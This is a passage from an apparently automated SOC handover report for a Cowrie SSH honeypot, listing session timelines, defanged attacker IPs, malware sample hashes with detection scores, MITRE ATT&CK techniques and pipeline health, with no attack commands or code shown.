| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 04:07:28` | `cowrie.session.connect` |
| `2026-03-28 04:07:28` | `cowrie.client.version` |
| `2026-03-28 04:07:28` | `cowrie.client.kex` |
| `2026-03-28 04:07:29` | `cowrie.login.success` |
| `2026-03-28 04:07:29` | `cowrie.session.params` |
| `2026-03-28 04:07:29` | `cowrie.command.input` |
| `2026-03-28 04:07:29` | `cowrie.command.failed` |
| `2026-03-28 04:07:29` | `cowrie.log.closed` |
| `2026-03-28 04:07:29` | `cowrie.session.params` |
| `2026-03-28 04:07:29` | `cowrie.command.input` |
| `2026-03-28 04:07:29` | `cowrie.session.file_download` |
| `2026-03-28 04:07:29` | `cowrie.log.closed` |
| `2026-03-28 04:07:42` | `cowrie.session.params` |
| `2026-03-28 04:07:42` | `cowrie.command.input` |
| `2026-03-28 04:07:42` | `cowrie.log.closed` |
| `2026-03-28 04:07:42` | `cowrie.session.params` |
| `2026-03-28 04:07:42` | `cowrie.command.input` |
| `2026-03-28 04:07:42` | `cowrie.log.closed` |
| `2026-03-28 04:07:42` | `cowrie.session.params` |
| `2026-03-28 04:07:42` | `cowrie.command.input` |
| `2026-03-28 04:07:42` | `cowrie.session.file_download` |
| `2026-03-28 04:07:42` | `cowrie.log.closed` |
| `2026-03-28 04:07:43` | `cowrie.session.params` |
| `2026-03-28 04:07:43` | `cowrie.command.input` |
| `2026-03-28 04:07:43` | `cowrie.log.closed` |
| `2026-03-28 04:07:43` | `cowrie.session.params` |
| `2026-03-28 04:07:43` | `cowrie.command.input` |
| `2026-03-28 04:07:43` | `cowrie.log.closed` |
| `2026-03-28 04:07:43` | `cowrie.session.params` |
| `2026-03-28 04:07:43` | `cowrie.command.input` |
| `2026-03-28 04:07:43` | `cowrie.command.input` |
| `2026-03-28 04:07:43` | `cowrie.log.closed` |
| `2026-03-28 04:07:44` | `cowrie.session.params` |
| `2026-03-28 04:07:44` | `cowrie.command.input` |
| `2026-03-28 04:07:44` | `cowrie.log.closed` |
| `2026-03-28 04:07:44` | `cowrie.session.params` |
| `2026-03-28 04:07:44` | `cowrie.command.input` |
| `2026-03-28 04:07:44` | `cowrie.log.closed` |
| `2026-03-28 04:07:44` | `cowrie.session.params` |
| `2026-03-28 04:07:44` | `cowrie.command.input` |
| `2026-03-28 04:07:45` | `cowrie.log.closed` |
| `2026-03-28 04:07:45` | `cowrie.session.params` |
| `2026-03-28 04:07:45` | `cowrie.command.input` |
| `2026-03-28 04:07:45` | `cowrie.log.closed` |
| `2026-03-28 04:07:45` | `cowrie.session.params` |
| `2026-03-28 04:07:45` | `cowrie.command.input` |
| `2026-03-28 04:07:45` | `cowrie.log.closed` |
| `2026-03-28 04:07:45` | `cowrie.session.params` |
| `2026-03-28 04:07:45` | `cowrie.command.input` |
| `2026-03-28 04:07:46` | `cowrie.log.closed` |
| `2026-03-28 04:07:46` | `cowrie.session.params` |
| `2026-03-28 04:07:46` | `cowrie.command.input` |
| `2026-03-28 04:07:46` | `cowrie.log.closed` |
| `2026-03-28 04:07:46` | `cowrie.session.params` |
| `2026-03-28 04:07:46` | `cowrie.command.input` |
| `2026-03-28 04:07:46` | `cowrie.log.closed` |
| `2026-03-28 04:07:46` | `cowrie.session.params` |
| `2026-03-28 04:07:46` | `cowrie.command.input` |
| `2026-03-28 04:07:47` | `cowrie.log.closed` |
| `2026-03-28 04:07:47` | `cowrie.session.params` |
| `2026-03-28 04:07:47` | `cowrie.command.input` |
| `2026-03-28 04:07:47` | `cowrie.log.closed` |
| `2026-03-28 04:07:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.231[.]135` to AbuseIPDB if not already reported
- [ ] Block `147.50.231[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `180.76.143[.]203` | **18** | 2026-03-28 03:27 | 2026-03-28 04:16 | 18m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `147.50.231[.]135` | **8** | 2026-03-28 03:16 | 2026-03-28 04:02 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `3.143.162[.]210` | **4** | 2026-03-28 03:58 | 2026-03-28 04:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.54[.]95` | **2** | 2026-03-28 02:36 | 2026-03-28 02:38 | 4m | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]108` | **2** | 2026-03-28 02:01 | 2026-03-28 02:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.47.161[.]42` | 1 | 2026-03-28 03:26 | 2026-03-28 03:26 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.250.160[.]76` | 1 | 2026-03-28 04:17 | 2026-03-28 04:17 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.164.239[.]190` | 1 | 2026-03-28 03:20 | 2026-03-28 03:20 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.99.102[.]20` | 1 | 2026-03-28 03:03 | 2026-03-28 03:03 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.160.166[.]237` | 1 | 2026-03-28 02:03 | 2026-03-28 02:03 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.52[.]58` | 1 | 2026-03-28 03:18 | 2026-03-28 03:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.73[.]11` | 1 | 2026-03-28 03:15 | 2026-03-28 03:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.107.185[.]138` | 1 | 2026-03-28 02:09 | 2026-03-28 02:09 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `129.204.203[.]60` | 1 | 2026-03-28 03:14 | 2026-03-28 03:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.129[.]174` | 1 | 2026-03-28 03:39 | 2026-03-28 03:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `175.206.113[.]91` | 1 | 2026-03-28 03:48 | 2026-03-28 03:48 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `179.184.218[.]49` | 1 | 2026-03-28 02:23 | 2026-03-28 02:23 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.184.36[.]192` | 1 | 2026-03-28 04:06 | 2026-03-28 04:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.94.74[.]94` | 1 | 2026-03-28 02:41 | 2026-03-28 02:41 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `181.129.31[.]42` | 1 | 2026-03-28 03:57 | 2026-03-28 03:57 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `185.6.2[.]126` | 1 | 2026-03-28 03:12 | 2026-03-28 03:12 | 8s | 0 | `T1592` | 🟢 LOW |
| `202.111.173[.]175` | 1 | 2026-03-28 04:04 | 2026-03-28 04:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `203.92.36[.]109` | 1 | 2026-03-28 04:05 | 2026-03-28 04:05 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.20.26[.]201` | 1 | 2026-03-28 02:00 | 2026-03-28 02:00 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.4.156[.]254` | 1 | 2026-03-28 02:26 | 2026-03-28 02:26 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `34.41.211[.]48` | 1 | 2026-03-28 04:24 | 2026-03-28 04:25 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `46.161.196[.]5` | 1 | 2026-03-28 02:06 | 2026-03-28 02:06 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `46.59.91[.]4` | 1 | 2026-03-28 02:40 | 2026-03-28 02:40 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.151[.]15` | 1 | 2026-03-28 04:08 | 2026-03-28 04:08 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `60.167.19[.]189` | 1 | 2026-03-28 03:10 | 2026-03-28 03:10 | 34s | 0 | `T1592` | 🟢 LOW |
| `60.251.229[.]144` | 1 | 2026-03-28 03:45 | 2026-03-28 03:45 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `62.60.244[.]109` | 1 | 2026-03-28 03:56 | 2026-03-28 03:56 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.149[.]239` | 1 | 2026-03-28 02:49 | 2026-03-28 02:49 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.153[.]146` | 1 | 2026-03-28 03:05 | 2026-03-28 03:05 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `82.156.211[.]131` | 1 | 2026-03-28 03:07 | 2026-03-28 03:09 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `211.20.26[.]201` | TW | Data Communication Business Group, | **100** ⚠️ | 15 |
| `62.60.244[.]109` | DE | NetCrafters OU | **100** ⚠️ | 2 |
| `103.250.160[.]76` | IN | Gtpl Broadband Pvt. Ltd. | **100** ⚠️ | 39 |
| `82.156.211[.]131` | CN | Tencent Cloud Computing (Beijing) Co., Ltd | **100** ⚠️ | 9 |
| `65.20.149[.]239` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 31 |
| `202.111.173[.]175` | CN | Yanji City, Dunhua Town Government Network, Jilin Province, China. | **100** ⚠️ | 38 |
| `101.47.161[.]42` | SG | BYTEPLUS | **100** ⚠️ | 44 |
| `179.184.218[.]49` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 26 |
| `180.76.143[.]203` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 3 |
| `180.94.74[.]94` | AF | GCN/DCN Networks | **100** ⚠️ | 24 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 90 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 34 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 25 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 14 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 14 |

---

## 🔕 False Positive Summary (11 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 8 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 100 cases |
| Tool 34  | Credential Extractor        | ✅ 59 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 46 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 11 filtered (11.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 32 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 25 priority case(s) shown individually · 35 recon entry/entries in table (5 group(s) consolidating 34 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-28T04:27:20Z_
